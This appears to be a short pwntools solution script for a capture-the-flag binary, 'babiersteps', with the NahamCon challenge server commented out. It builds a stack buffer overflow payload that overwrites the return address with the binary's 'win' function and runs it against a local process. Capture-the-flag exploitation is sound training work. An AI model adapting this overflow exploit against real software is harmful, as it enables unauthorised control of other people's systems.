from pwn import *

elf = ELF('./babiersteps')

offset = cyclic_find(0x62616166)

context.binary = elf

payload = offset * b'a'
payload += p64(elf.symbols.win)

# with remote('challenge.nahamcon.com', 31262) as p:
with elf.process() as p:
    p.sendline(payload)
    p.interactive()